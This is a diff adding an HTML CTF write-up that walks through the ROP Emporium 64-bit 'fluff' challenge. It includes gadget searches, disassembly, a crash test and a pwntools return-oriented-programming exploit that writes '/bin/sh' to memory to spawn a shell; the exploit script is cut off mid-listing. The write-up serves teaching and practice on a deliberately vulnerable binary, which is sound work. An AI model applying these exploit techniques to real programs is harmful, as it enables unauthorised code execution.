@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+    <sidenav>
+        <ol>
+            <a href="#h2-1">* Challenge Description</a><br>
+            <a href="#h3-1">* Exploit Outline</a><br>
+            <br>
+            <a href="#h2-2">* fluff Solution</a><br>
+            <a href="#h2-3">1) Find address of system()</a><br>
+            <a href="#h2-4">2) Find a pop rdi; ret gadget</a><br>
+            <a href="#h2-5">3) Find a writable memory address</a><br>
+            <a href="#h2-6">4) Write the initial exploit script</a><br>
+                &emsp;&emsp;&emsp;<a href="#h2-7">* Clever Use of Gadgets</a><br>
+                &emsp;&emsp;&emsp;<a href="#h2-8">* Which gadgets to use?</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-2">#1 - mov</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-3">#2 - xor, pop, xor</a><br>
+            <a href="#h2-9">5) Find Gadget Addresses</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-4">* Be careful with these gadgets</a><br>
+            <a href="#h2-10">6) Write Exploit Script/ROP Chain</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-5">- Goal:</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-6">- Plan:</a><br>
+                &emsp;&emsp;&emsp;<a href="#h3-7">- Exploit Script</a><br>
+            <a href="#h2-11">7) Mischevious Gadget</a><br>
+            <a href="#h2-12">8) Write Final Exploit Script</a><br>
+            <a href="#h2-13">9) Win!</a><br>
+        </ol>
+    </sidenav>
+
+    <writeup>
+        <h1><strong>#ROP Emporium - 64bit - fluff</strong></h1>
+        <a href="https://ropemporium.com/challenge/fluff.html">https://ropemporium.com/challenge/fluff.html</a><br>
+        <br>
+        <img alt="images\11-1.png" src="images/11-1.png"><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>Challenge Description</strong></h2><br>
+        Description for <code>fluff</code> on ropemporium:<br>
+            <div class="codebox">
+                The&nbsp;concept&nbsp;here&nbsp;is&nbsp;identical&nbsp;to&nbsp;the&nbsp;write4&nbsp;challenge.&nbsp;The&nbsp;only&nbsp;difference&nbsp;is&nbsp;we&nbsp;may&nbsp;struggle&nbsp;to&nbsp;find&nbsp;gadgets&nbsp;that&nbsp;will&nbsp;get&nbsp;the&nbsp;job&nbsp;done.&nbsp;If&nbsp;we&nbsp;take&nbsp;the&nbsp;time&nbsp;to&nbsp;consider&nbsp;a&nbsp;different&nbsp;approach&nbsp;we'll&nbsp;succeed.
+            </div>
+        </div><br>
+        <br>
+        The goal is to write "/bin/sh" into memory so that we can spawn a shell using system() and read the flag.<br>
+        <br>
+        The problem is that, whilst there's <code>mov</code> gadget that we can use to write to memory, there's no straightforward of setting up the registers for the <code>mov</code> gadget like there was in <code>write4</code>. Here, we need to find an alternative/indirect way of setting up the registers.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>Exploit Outline</strong></h3><br>
+        1. Overflow the buffer and overwrite RIP at 40 bytes<br>
+        2. Write "/bin/sh\x00" to the stack<br>
+        3. Write the address of a writable region of memory onto the stack<br>
+        4. Pop "/bin/sh\x00" string into register A<br>
+        5. Pop the address of the writable memory region into register B<br>
+        6. Use a <code>mov</code> gadget to write the string in register A to the address in register B<br>
+        7. Pop the string from memory - "/bin/sh\x00" - into RDI and run system(), spawning a shell!<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>fluff Solution</strong></h2><br>
+        For this exploit, we'll first create a template script.<br>
+        We need to find:<br>
+        • Address of <code>system()</code><br>
+        • A <code>pop rdi; ret</code> gadget to pop our string into RDI for use with system()<br>
+        • A writable memory address<br>
+        • Gadgets to write value to memory<br>
+        <br>
+        Following that, we'll look at the gadgets available using <code>objdump</code> and <code>ropper</code> and piece together a way to write a value to memory.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>1) Find address of system()</strong></h2><br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;rabin2&nbsp;-i&nbsp;fluff<br>
+                [Imports]<br>
+                Num&nbsp;&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;1&nbsp;0x004005d0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;puts<br>
+                &nbsp;&nbsp;&nbsp;2&nbsp;0x004005e0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;system<br>
+                &nbsp;&nbsp;&nbsp;3&nbsp;0x004005f0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;printf<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <code>system()</code> is located at <code>0x004005e0</code>.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>2) Find a pop rdi; ret gadget</strong></h2><br>
+        This gadget will pop our command to be run with system() - <code>/bin/sh</code> - into RDI.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;ropper&nbsp;--file&nbsp;fluff&nbsp;--search&nbsp;"pop&nbsp;rdi"<br>
+                [INFO]&nbsp;Load&nbsp;gadgets&nbsp;from&nbsp;cache<br>
+                [LOAD]&nbsp;loading...&nbsp;100%<br>
+                [LOAD]&nbsp;removing&nbsp;double&nbsp;gadgets...&nbsp;100%<br>
+                [INFO]&nbsp;Searching&nbsp;for&nbsp;gadgets:&nbsp;pop&nbsp;rdi<br>
+                <br>
+                [INFO]&nbsp;File:&nbsp;fluff<br>
+                ...<br>
+                0x00000000004008c3:&nbsp;pop&nbsp;rdi;&nbsp;ret;
+            </div>
+        </div><br>
+        <br>
+        There's a <code>pop rdi; ret</code> at <code>0x004008c3</code><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>3) Find a writable memory address</strong></h2><br>
+        We need an address we can write our "/bin/sh\x00" string to.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;rabin2&nbsp;-S&nbsp;fluff<br>
+                [Sections]<br>
+                Nm&nbsp;Paddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memsz&nbsp;Perms&nbsp;Name<br>
+                00&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;----&nbsp;<br>
+                ...<br>
+                19&nbsp;0x00000e10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.init_array<br>
+                20&nbsp;0x00000e18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.fini_array<br>
+                21&nbsp;0x00000e20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600e20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.jcr<br>
+                22&nbsp;0x00000e28&nbsp;&nbsp;&nbsp;464&nbsp;0x00600e28&nbsp;&nbsp;&nbsp;464&nbsp;-rw-&nbsp;.dynamic<br>
+                23&nbsp;0x00000ff8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;0x00600ff8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;-rw-&nbsp;.got<br>
+                24&nbsp;0x00001000&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;0x00601000&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;-rw-&nbsp;.got.plt<br>
+                25&nbsp;0x00001050&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;0x00601050&nbsp;&nbsp;&nbsp;&nbsp;16&nbsp;-rw-&nbsp;.data<br>
+                26&nbsp;0x00001060&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0x00601060&nbsp;&nbsp;&nbsp;&nbsp;48&nbsp;-rw-&nbsp;.bss<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <code>.data</code> looks good. It's located at <code>0x00601050</code>.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>4) Write the initial exploit script</strong></h2><br>
+        Write up your exploit so that it'll correctly overflow the buffer and crash the binary.<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;GADGETS&nbsp;---------</span><br>
+                data_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00601050</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-S&nbsp;fluff</span><br>
+                <br>
+                pop_rdi_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x004008c3</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;rdi;&nbsp;ret;</span><br>
+                system_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x004005e0</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-i&nbsp;fluff</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;EXPLOIT&nbsp;---------</span><br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span><br>
+                payload&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"B"</span>*<span style="color:#ff0044;font-weight:400">5</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;python&nbsp;initial.py&nbsp;&gt;&nbsp;&nbsp;initial.txt<br>
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;gdb&nbsp;-q&nbsp;fluff<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;fluff...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;r&nbsp;&lt;&nbsp;initial.txt<br>
+                ...<br>
+                Stopped&nbsp;reason:&nbsp;SIGSEGV<br>
+                0x00000a4242424242&nbsp;in&nbsp;??&nbsp;()
+            </div>
+        </div><br>
+        <br>
+        We now have a base template to work off of.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>Clever Use of Gadgets</strong></h2><br>
+        We need to find a way of writing <code>/bin/sh</code> to memory.<br>
+        Have a look at the gadgets provided for us in the <code>questionableGadgets</code> function.<br>
+        <br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;objdump&nbsp;-M&nbsp;intel&nbsp;-d&nbsp;fluff<br>
+                <br>
+                fluff:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file&nbsp;format&nbsp;elf64-x86-64<br>
+                ...<br>
+                0000000000400820&nbsp;&lt;questionableGadgets&gt;:<br>
+                &nbsp;&nbsp;400820: 41&nbsp;5f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r15<br>
+                &nbsp;&nbsp;400822: 4d&nbsp;31&nbsp;db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;r11,r11<br>
+                &nbsp;&nbsp;400825: 41&nbsp;5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r14<br>
+                &nbsp;&nbsp;400827: bf&nbsp;50&nbsp;10&nbsp;60&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;edi,0x601050<br>
+                &nbsp;&nbsp;40082c: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;40082d: 41&nbsp;5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r14<br>
+                &nbsp;&nbsp;40082f: 4d&nbsp;31&nbsp;e3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;r11,r12<br>
+                &nbsp;&nbsp;400832: 41&nbsp;5c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r12<br>
+                &nbsp;&nbsp;400834: 41&nbsp;bd&nbsp;60&nbsp;40&nbsp;60&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;r13d,0x604060<br>
+                &nbsp;&nbsp;40083a: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;40083b: bf&nbsp;50&nbsp;10&nbsp;60&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;edi,0x601050<br>
+                &nbsp;&nbsp;400840: 4d&nbsp;87&nbsp;d3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xchg&nbsp;&nbsp;&nbsp;r11,r10<br>
+                &nbsp;&nbsp;400843: 41&nbsp;5f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r15<br>
+                &nbsp;&nbsp;400845: 41&nbsp;bb&nbsp;50&nbsp;20&nbsp;60&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;r11d,0x602050<br>
+                &nbsp;&nbsp;40084b: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;40084c: 41&nbsp;5f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r15<br>
+                &nbsp;&nbsp;40084e: 4d&nbsp;89&nbsp;1a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[r10],r11<br>
+                &nbsp;&nbsp;400851: 41&nbsp;5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r13<br>
+                &nbsp;&nbsp;400853: 41&nbsp;5c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp;r12<br>
+                &nbsp;&nbsp;400855: 45&nbsp;30&nbsp;22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[r10],r12b<br>
+                &nbsp;&nbsp;400858: c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;400859: 0f&nbsp;1f&nbsp;80&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp; nop&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[rax+0x0]
+            </div>
+        </div><br>
+        <br>
+        It's not obvious, but we have enough gadgets to write a string to memory here.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>Which gadgets to use?</strong></h2><br>
+        Like the page description for <code>fluff</code> says, try working backwards.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>#1 - mov</strong></h3><br>
+        First, find a suitable mov instruction<br>
+            <div class="codebox">
+                mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[r10],r11
+            </div>
+        </div><br>
+        <br>
+        This <code>mov</code> will move the value in <code>r11</code> to the address pointed to by the value in <code>r10</code>.<br>
+        This means that our string - <code>/bin/sh\x00</code> - needs to go in <code>r11</code>.<br>
+        And the memory address to write to - the address of the <code>.data</code> section - needs to in <code>r12</code>.<br>
+        <br>
+        <code>r10</code> = address of .data<br>
+        <code>r11</code> = "/bin/sh\x00"<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>#2 - xor, pop, xor</strong></h3><br>
+        Next, we need to find a way to put data into registers <code>r10</code> and <code>r11</code>.<br>
+        There's 4 intructions we can to use to set up the registers.<br>
+            <div class="codebox">
+                xor&nbsp;&nbsp;&nbsp;&nbsp;r11,r11<br>
+                pop&nbsp;&nbsp;&nbsp;&nbsp;r12<br>
+                xor&nbsp;&nbsp;&nbsp;&nbsp;r11,r12<br>
+                xchg&nbsp;&nbsp;&nbsp;r11,r10
+            </div>
+        </div><br>
+        <br>
+        <strong>Instructions to set up r10 = .data address</strong><br>
+        • First, we xor r11 with r11, which will empty the register and set r11 to <code>0</code> - <code>xor r11, r11</code><br>
+        • Next, we pop the <code>.data</code> address into r12 - <code>pop r12</code>.<br>
+        • Third, we xor r11 with r12 (which contains our .data address) - <code>xor r11,r12</code><br>
+        ◇ <code>r11</code> contains our xor key - <code>0</code><br>
+        ◇ When you xor a value with 0 (i.e. nothing), the value won't change<br>
+        ◇ The result is that our <code>.data</code> address in <code>r12</code> gets copied into <code>r11</code><br>
+        • Last, we use <code>xchg r11, r10</code> to move our .data address into <code>r10</code><br>
+        <br>
+        <strong>Instructions to set up r11 = "/bin/sh\x00"</strong><br>
+        Setting up r11 is the exact same as above except that we don't need the <code>xchg</code> instruction.<br>
+        • First, empty r11 with <code>xor r11, r11</code><br>
+        • Next, pop the "/bin/sh\x00" string in hex format inro r12 - <code>pop r12</code><br>
+        • Last, xor r11 with r12 to copy the "/bin/sh\x00" string from r12 into r11 - <code>xor r11, r12</code><br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>5) Find Gadget Addresses</strong></h2><br>
+        We now know the gadgets we need to use in order to write our string to memory.<br>
+        Go find the addresses of them.<br>
+        I'm using ropper - <a href="https://github.com/sashs/Ropper">https://github.com/sashs/Ropper</a><br>
+        <br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;ropper&nbsp;--file&nbsp;fluff&nbsp;--search&nbsp;"mov&nbsp;[r10]"<br>
+                0x000000000040084e:&nbsp;mov&nbsp;qword&nbsp;ptr&nbsp;[r10],&nbsp;r11;&nbsp;pop&nbsp;r13;&nbsp;pop&nbsp;r12;&nbsp;xor&nbsp;byte&nbsp;ptr&nbsp;[r10],&nbsp;r12b;&nbsp;ret;&nbsp;<br>
+                <br>
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;ropper&nbsp;--file&nbsp;fluff&nbsp;--search&nbsp;"pop&nbsp;r12"<br>
+                0x0000000000400832:&nbsp;pop&nbsp;r12;&nbsp;mov&nbsp;r13d,&nbsp;0x604060;&nbsp;ret;&nbsp;<br>
+                <br>
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;ropper&nbsp;--file&nbsp;fluff&nbsp;--search&nbsp;"xor&nbsp;r11"<br>
+                0x0000000000400822:&nbsp;xor&nbsp;r11,&nbsp;r11;&nbsp;pop&nbsp;r14;&nbsp;mov&nbsp;edi,&nbsp;0x601050;&nbsp;ret;&nbsp;<br>
+                0x000000000040082f:&nbsp;xor&nbsp;r11,&nbsp;r12;&nbsp;pop&nbsp;r12;&nbsp;mov&nbsp;r13d,&nbsp;0x604060;&nbsp;ret;<br>
+                <br>
+                root@city64:~/ctf/ropemporium/fluff#&nbsp;ropper&nbsp;--file&nbsp;fluff&nbsp;--search&nbsp;"xchg"<br>
+                0x0000000000400840:&nbsp;xchg&nbsp;r11,&nbsp;r10;&nbsp;pop&nbsp;r15;&nbsp;mov&nbsp;r11d,&nbsp;0x602050;&nbsp;ret;
+            </div>
+        </div><br>
+        <br>
+        • <code>mov [r10], r11</code> is at <code>0x0040084e</code><br>
+        • <code>xor r11, r12</code> is at <code>0x0040082f<br></code>• <code>pop r12</code> is at <code>0x00400832<br></code>• <code>xor r11,r12</code> is at <code>0x0040082f<br></code>• <code>xchg r11,r10</code> is at <code>0x00400840</code><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>Be careful with these gadgets</strong></h3><br>
+        You should note that with these gadgets, unlike before, there are trailing instructions before the <code>ret</code>.<br>
+        This means that, depending on the trailing instruction, you'll have to provide junk data until you reach the <code>ret</code>.<br>
+        <br>
+        This, as you'll see, will mess with your exploit.<br>
+        <br>
+        <em><strong>For example</strong></em><strong>,</strong><br>
+        We're using the <code>xor r11, r11; pop r14; mov edi, 0x601050; ret;</code> gadget.<br>
+        First, we use the instruction we're wanting to use - <code>xor r11, r11</code><br>
+        Next, because of the trailing <code>pop r14</code>, we need to provide junk data that can be popped into r14 - <code>payload += "B"*8</code><br>
+        Third, the <code>mov</code> instruction doesn't need any junk data to run, so we don't have to write anything to the stack.<br>
+        Lastly, we hit the <code>ret</code> and can move on to our next gadget.<br>
+        <br>
+        <a id="h2-10" name="h2-10"></a><strong></strong>
+        <h2><strong>6) Write Exploit Script/ROP Chain</strong></h2><br>
+        We have all the gadgets we need and their addresses. Write up your exploit!<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>Goal:</strong></h3><br>
+        Write "/bin/sh" to memory, pop it into RDI and run system()<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>Plan:</strong></h3><br>
+        <strong>#Part 1 - Put writable memory address - .data - into r10</strong><br>
+        1. xor r11 with r11, which will empty the register and set r11 to <code>0</code> - <code>xor r11, r11</code><br>
+        2. pop the <code>.data</code> address into r12 - <code>pop r12</code>.<br>
+        3. xor r11 with r12 to copy .data address into r11 - <code>xor r11,r12</code><br>
+        4. <code>xchg r11, r10</code> to move our .data address into <code>r10</code><br>
+        <br>
+        <strong>#Part 2 - Put "/bin/sh\x00" string into r11</strong><br>
+        1. empty r11 with <code>xor r11, r11</code><br>
+        2. pop the "/bin/sh\x00" string in big-endian hex format inro r12 - <code>pop r12</code><br>
+        3. xor r11 with r12 to copy the "/bin/sh\x00" string from r12 into r11 - <code>xor r11, r12</code><br>
+        <br>
+        <strong>#Part 3 - Write "/bin/sh\x00" to memory</strong><br>
+        1. mov r11 ("/bin/sh" string) into address pointed to by r12 (.data address)<br>
+        <br>
+        <strong>#Part 4 - Run system("/bin/sh")</strong><br>
+        1. pop "/bin/sh" string into RDI<br>
+        2. run system()<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>Exploit Script</strong></h3><br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;---------&nbsp;GADGETS&nbsp;---------</span><br>
+                xor_r11_r11_pop_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00400822</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r11;&nbsp;pop&nbsp;r14;&nbsp;mov&nbsp;edi,&nbsp;0x601050;&nbsp;ret;</span><br>
+                pop_r12_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00400832</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;r12;&nbsp;mov&nbsp;r13d,&nbsp;0x604060;&nbsp;ret;</span><br>
+                data_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00601050</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;rabin2&nbsp;-S&nbsp;fluff</span><br>
+                xor_r11_r12_pop_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0040082f</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xor&nbsp;r11,&nbsp;r12;&nbsp;pop&nbsp;r12;&nbsp;mov&nbsp;r13d,&nbsp;0x604060;&nbsp;ret;</span><br>
+                xchg_r11_r10_pop_mov_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x00400840</span>)&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;xchg&nbsp;r11,&nbsp;r10;&nbsp;pop&nbsp;r15;&nbsp;mov&nbsp;r11d,&nbsp;0x602050;&nbsp;ret;</span><br>
+                <br>
+                binsh_hex&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x2f62696e2f736800</span>,&nbsp;endianness=<span style="color:#3ad900;font-weight:400">"big"</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;/bin/sh\x00</span><br>
+                mov_pop_pop_xor_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0040084e</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;mov&nbsp;qword&nbsp;ptr&nbsp;[r10],&nbsp;r11;&nbsp;pop&nbsp;r13;&nbsp;pop&nbsp;r12;&nbsp;xor&nbsp;byte&nbsp;ptr&nbsp;[r10],&nbsp;r12b;&nbsp;ret;</span><br>
+                <br>
